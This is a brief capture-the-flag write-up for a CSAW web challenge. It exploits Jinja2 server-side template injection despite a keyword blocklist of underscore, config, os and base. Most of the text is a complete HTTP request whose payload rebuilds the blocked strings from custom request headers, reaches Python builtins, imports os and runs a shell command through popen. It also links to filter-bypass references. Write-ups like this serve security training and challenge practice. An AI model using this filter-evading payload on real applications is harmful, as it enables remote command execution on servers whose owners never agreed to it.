* Jinja python SSTI
* Bypass a few keywords are required
```
Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base
```

* Final Payload to bypass the keyword check with headers
```
GET /submit?value={{request|attr('application')|attr((request.headers.score*2,'globals',request.headers.score*2)|join)|attr((request.headers.score*2,'getitem',request.headers.score*2)|join)((request.headers.score*2,'builtins',request.headers.score*2)|join)|attr((request.headers.score*2,'getitem',request.headers.score*2)|join)((request.headers.score*2,request.headers.imp,request.headers.score*2)|join)(request.headers.bypass)|attr('popen')('id')|attr('read')()}} HTTP/1.1
Host: web.chal.csaw.io:5000
Bypass: os
Score: _
Imp: import
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://web.chal.csaw.io:5000/
Upgrade-Insecure-Requests: 1
```

* references:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass
  - https://0day.work/jinja2-template-injection-filter-bypasses/